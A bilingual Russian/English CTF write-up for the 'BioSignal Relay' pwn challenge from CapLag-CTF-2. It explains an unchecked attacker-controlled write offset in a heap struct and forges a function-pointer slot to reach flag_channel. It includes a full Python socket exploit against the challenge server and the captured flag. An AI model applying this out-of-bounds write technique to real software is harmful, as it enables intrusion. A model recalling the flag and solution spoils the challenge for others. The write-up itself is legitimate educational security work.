# CapLag-CTF-2 The Heart of Sysola [RUS/ENG]

> **Дисклеймер:** баг найден и эксплуатирован самостоятельно; при анализе дизасма и оформлении этого райтапа ***использован ИИ/LLM как помощника***

## BioSignal Relay - pwn writeup

**Категория:** PWN

**Флаг:** `caplag{clp_header_extension_rewired_the_channel}`

```
CapLag-CTF-2/
├── README.md
├── WRITEUP.md
├── Case/
│   └── biosignal-relay
└── Script PoC/
    └── exploit.py
```

[RUS](#rus) | [ENG](#eng)

---

## [RUS]

Внутри `upload()` парсится небольшой заголовок "CLP", и байты 6–7 присланного пейлоада используются напрямую как смещение записи относительно единственной структуры программы в куче (`lab`) - без всякой проверки границ. То есть по сути дают запись по произвольному смещению внутри бинарника. `convert()` затем смотрит на один из двух "слотов канала" в этой структуре, и если магическое значение совпадает - прыгает по указателю функции, который лежит сразу после него. Прыгнуть можно только на одну из двух зашитых функций (`audit_channel` или `flag_channel`), так что произвольного выполнения кода тут нет и не нужно.

Ключевая деталь, которую легко проглядеть: один из двух слотов (`lab+0x40`) вообще никогда не трогается штатной инициализацией программы. А значит через OOB-запись его можно заполнить с нуля своими значениями - записать правильную магию и адрес `flag_channel`, после чего вызвать `convert channel 0`, и флаг напечатается.

---

### 1. Разведка

Начало:

```
file biosignal-relay
readelf -h biosignal-relay
readelf -l biosignal-relay | grep -A1 GNU_STACK
readelf -d biosignal-relay | grep BIND_NOW
```

Бинарник - x86-64, без PIE (адреса фиксированные, ASLR можно не думать вообще), NX включён, RELRO Full, канарейка неважна - переполнения стека тут нет. Символы не вырезаны, что сразу подсказывает: это не задача на утечки и ROP-цепочки, это логический баг, который можно найти прямо в дизассемблере.

```
nm biosignal-relay | grep ' [Tt] '
```

Выхлоп: `main`, `upload`, `convert`, `audit_channel`, `flag_channel`, `read_ulong`, `read_exact` и пара служебных функций для чтения строк и печати флага. `flag_channel` и `print_flag` - очевидная цель, дальше просто нужно понять, как до неё добраться.

### 2. Что вообще меняется в программе

```
lab = calloc(1, 0xA0);   // 160 байт, выделяется один раз при старте
```

`lab` - единственный изменяемый кусок состояния во всей программе. В таких задачках почти всегда всё крутится вокруг одного буфера - сначала нужно его найти, дальше уже понятнее, куда копать.

### 3. Разбор `upload()`

По шагам, что делает функция:

1. `read_ulong()` - читает `len`, должно быть ≤ 0x200 (512).
2. `read_exact(stack_buf, len)` - читает `len` сырых байт на стек.
3. Проверяет заголовок: `buf[0:4] == "ICLP"`, `buf[4]=='C'`, `buf[5]=='L'` (итого магия `"ICLPCL"`). Не совпало - "unknown signal file".
4. Копирование №1: `lab[0 : min(len,64)) = buf[0 : min(len,64))`.
5. Если `len > 16` - копирование №2: `lab[r8w : r8w + (len-16)) = buf[16:len)`, где `r8w = *(uint16_t*)(buf+6)` - **полностью контролируется атакующим**.
6. И безусловно, при каждом вызове, программа сбрасывает `lab[0x70:0x8A]` в фиксированную запись "канала аудита" (магия + указатель на `audit_channel` + строка "reference").

Шаг 5 и есть уязвимость. Смещение для второго копирования берётся буквально из байт 6–7 нашего пейлоада, никаких ограничений на него нет (кроме диапазона 16-битного числа). Длина записи ограничена (максимум около 496 байт), а вот куда писать - нет вообще.

Шаг 6 тоже важен, но по другой причине: он затирает `lab+0x70` и выше в конце каждого успешного `upload()`. То есть всё, что мы туда запишем через OOB, будет тут же перезаписано обратно. Этот слот - тупик, можно сразу забыть про него.

### 4. Проверка в `convert()`

```
idx = read_ulong();          // 0 или 1
slot = lab + 48 * idx;

if (*(uint64_t*)(slot + 0x40) != 0x42494F2143484E31)
    -> "bad channel"

fn = *(uint64_t*)(slot + 0x48);
if (fn != &flag_channel && fn != &audit_channel)
    -> "channel not approved"

((void(*)(void*))fn)(slot + 0x40);
```

Два индекса - два слота. Слот 1 (`lab+0x30`, магия на `lab+0x70`) всегда сбрасывается фиксированной инициализацией из шага 6, так что толку от него нет. Слот 0 (`lab+0x00`, магия на `lab+0x40`) инициализацией не трогается вообще - это и есть цель. Кстати, `lab+0x40` начинается ровно на байт дальше, чем заканчивается обычное копирование №1 (оно доходит до индекса 63), так что достать до него можно только через OOB-запись.

Указатель функции ограничен двумя разрешёнными адресами, так что тут не нужно (и не получится) выполнить что-то произвольное - просто нужно легитимно пройти проверку с адресом `flag_channel`.

### 5. Собираем payload

Нужно записать 16 байт начиная с `lab+0x40`: магию `0x42494F2143484E31` и адрес `&flag_channel` (`0x4013C0`).

```python
import struct

payload  = b"ICLP" + b"CL"                         # заголовок -> "ICLPCL"
payload += struct.pack("<H", 0x0040)               # bytes[6:8]  -> смещение = lab+0x40
payload += b"A" * 8                                # bytes[8:16] -> просто заполнитель
payload += struct.pack("<Q", 0x42494F2143484E31)   # bytes[16:24] -> магия
payload += struct.pack("<Q", 0x4013C0)              # bytes[24:32] -> &flag_channel
# len(payload) == 32
```

Логика простая: `len = 32 > 16`, значит второе копирование сработает и запишет `payload[16:32)` (ровно магию и указатель) в `lab+0x40`. Первое копирование заодно скопирует `payload[0:32)` в `lab[0:32)`, но это далеко от `lab+0x40`, так что друг другу они не мешают.

### 6. Эксплуатация

```
1) upload signal file, 32 байта пейлоада -> "clp header imported"
2) convert channel 0 -> магия на lab+0x40 совпадает, fn == &flag_channel,
   происходит переход -> flag_channel печатает CTF_FLAG
```

### 7. PoC

```python
#!/usr/bin/env python3
import socket, struct, sys, time

MAGIC = 0x42494F2143484E31
FLAG_CHANNEL = 0x00000000004013C0

def build_payload():
    p  = b"ICLP" + b"CL"
    p += struct.pack("<H", 0x40)
    p += b"A" * 8
    p += struct.pack("<Q", MAGIC)
    p += struct.pack("<Q", FLAG_CHANNEL)
    assert len(p) == 32
    return p

def recvuntil(sock, marker, timeout=5):
    sock.settimeout(timeout)
    data = b""
    while marker not in data:
        chunk = sock.recv(4096)
        if not chunk:
            break
        data += chunk
    return data

def run_remote(host, port):
    payload = build_payload()
    s = socket.create_connection((host, port), timeout=10)

    recvuntil(s, b">")
    s.sendall(b"1\n")
    recvuntil(s, b"bytes:")
    s.sendall(str(len(payload)).encode() + b"\n")
    recvuntil(s, b"payload:")
    s.sendall(payload)

    time.sleep(0.2)
    recvuntil(s, b">")
    s.sendall(b"2\n")
    recvuntil(s, b"channel:")
    s.sendall(b"0\n")

    time.sleep(0.2)
    print(s.recv(4096).decode(errors="replace"))
    s.close()

if __name__ == "__main__":
    run_remote(sys.argv[1], int(sys.argv[2]))
```

```
python3 exploit.py not-web.caplag-task.ru 31050
```

```
biosignal export: caplag{clp_header_extension_rewired_the_channel}
```

---

## [ENG]

`upload()` parses a small "CLP" header, and bytes 6–7 of the payload get used directly as a write offset relative to the program's one heap struct (`lab`) - no bounds check at all. That's an arbitrary-offset write inside the binary. `convert()` then checks one of two "channel slots" in that struct, and if the magic matches, jumps through a function pointer stored right after it. The jump target is whitelisted to two functions (`audit_channel` / `flag_channel`), so there's no need for (or possibility of) arbitrary code execution here.

The detail that's easy to miss: one of the two slots (`lab+0x40`) is never touched by the program's own init code. So the OOB write can forge it from scratch - write the right magic plus `flag_channel`'s address, then call `convert channel 0` and the flag gets printed.

No leaks, no ROP, no shellcode. Just the program confusing itself about which slot is trusted.

### 1. Recon

Standard start:

```
file biosignal-relay
readelf -h biosignal-relay
readelf -l biosignal-relay | grep -A1 GNU_STACK
readelf -d biosignal-relay | grep BIND_NOW
```

x86-64, no PIE (fixed addresses, don't need to worry about ASLR), NX on, full RELRO, canary doesn't matter since there's no stack overflow here. Symbols aren't stripped, which is a pretty strong hint this isn't a ROP/leak challenge - it's a logic bug you can find straight from the disassembly.

```
nm biosignal-relay | grep ' [Tt] '
```

`main`, `upload`, `convert`, `audit_channel`, `flag_channel`, `read_ulong`, `read_exact`, plus a couple of helpers for reading lines and printing the flag. `flag_channel` and `print_flag` are the obvious win condition - the rest is figuring out how to reach them.

### 2. The one thing that changes

```
lab = calloc(1, 0xA0);   // 160 bytes, allocated once at startup
```

`lab` is the only mutable state in the whole program. In challenges like this almost everything revolves around one buffer - find it first, the rest follows.

### 3. Reversing `upload()`

Step by step:

1. `read_ulong()` reads `len`, must be ≤ 0x200 (512).
2. `read_exact(stack_buf, len)` reads `len` raw bytes onto the stack.
3. Header check: `buf[0:4] == "ICLP"`, `buf[4]=='C'`, `buf[5]=='L'` (magic `"ICLPCL"`). Fails → "unknown signal file".
4. Copy #1: `lab[0 : min(len,64)) = buf[0 : min(len,64))`.
5. If `len > 16`, copy #2: `lab[r8w : r8w + (len-16)) = buf[16:len)`, where `r8w = *(uint16_t*)(buf+6)` - **fully attacker-controlled**.
6. Unconditionally, every single call resets `lab[0x70:0x8A]` to a fixed "audit channel" record.

Step 5 is the bug - the destination offset comes straight from bytes 6–7 of our own payload, no bound on it at all beyond being a 16-bit value. The write length is capped (~496 bytes max), but the destination isn't bounded in any way.

Step 6 matters for a different reason: it stomps `lab+0x70` and up at the end of every successful `upload()`. So anything written there via the OOB primitive gets clobbered right back. That slot's a dead end, not worth chasing.

### 4. The gate in `convert()`

```
idx = read_ulong();          // 0 or 1
slot = lab + 48 * idx;

if (*(uint64_t*)(slot + 0x40) != 0x42494F2143484E31)
    -> "bad channel"

fn = *(uint64_t*)(slot + 0x48);
if (fn != &flag_channel && fn != &audit_channel)
    -> "channel not approved"

((void(*)(void*))fn)(slot + 0x40);
```

Two indices, two slots. Slot 1 always gets reset by the fixed init from step 6, so it's useless. Slot 0 is never touched by init - that's the target. Conveniently it sits exactly one byte past where copy #1 stops (index 63), so it's only reachable through the OOB write, not the normal path.

The function pointer is whitelisted to two addresses, so there's nothing exotic needed - just legitimately pass the check with `flag_channel`'s address.

### 5. Building the payload

Need to write 16 bytes at `lab+0x40`: the magic `0x42494F2143484E31` and `&flag_channel` (`0x4013C0`).

```python
import struct

payload  = b"ICLP" + b"CL"
payload += struct.pack("<H", 0x0040)
payload += b"A" * 8
payload += struct.pack("<Q", 0x42494F2143484E31)
payload += struct.pack("<Q", 0x4013C0)
# len(payload) == 32
```

`len = 32 > 16` triggers the OOB copy, which writes `payload[16:32)` (magic + pointer) to `lab+0x40`. Copy #1 also dumps `payload[0:32)` into `lab[0:32)`, but that's nowhere near `lab+0x40`, so no interference.

### 6. Exploit flow

```
1) upload 32-byte payload -> "clp header imported"
2) convert channel 0 -> magic matches at lab+0x40, fn == &flag_channel,
   jump happens -> flag_channel prints CTF_FLAG
```

### 7. PoC

```python
#!/usr/bin/env python3
import socket, struct, sys, time

MAGIC = 0x42494F2143484E31
FLAG_CHANNEL = 0x00000000004013C0

def build_payload():
    p  = b"ICLP" + b"CL"
    p += struct.pack("<H", 0x40)
    p += b"A" * 8
    p += struct.pack("<Q", MAGIC)
    p += struct.pack("<Q", FLAG_CHANNEL)
    assert len(p) == 32
    return p

def recvuntil(sock, marker, timeout=5):
    sock.settimeout(timeout)
    data = b""
    while marker not in data:
        chunk = sock.recv(4096)
        if not chunk:
            break
        data += chunk
    return data

def run_remote(host, port):
    payload = build_payload()
    s = socket.create_connection((host, port), timeout=10)

    recvuntil(s, b">")
    s.sendall(b"1\n")
    recvuntil(s, b"bytes:")
    s.sendall(str(len(payload)).encode() + b"\n")
    recvuntil(s, b"payload:")
    s.sendall(payload)

    time.sleep(0.2)
    recvuntil(s, b">")
    s.sendall(b"2\n")
    recvuntil(s, b"channel:")
    s.sendall(b"0\n")

    time.sleep(0.2)
    print(s.recv(4096).decode(errors="replace"))
    s.close()

if __name__ == "__main__":
    run_remote(sys.argv[1], int(sys.argv[2]))
```

```
python3 exploit.py not-web.caplag-task.ru 31050
```

```
biosignal export: caplag{clp_header_extension_rewired_the_channel}
```
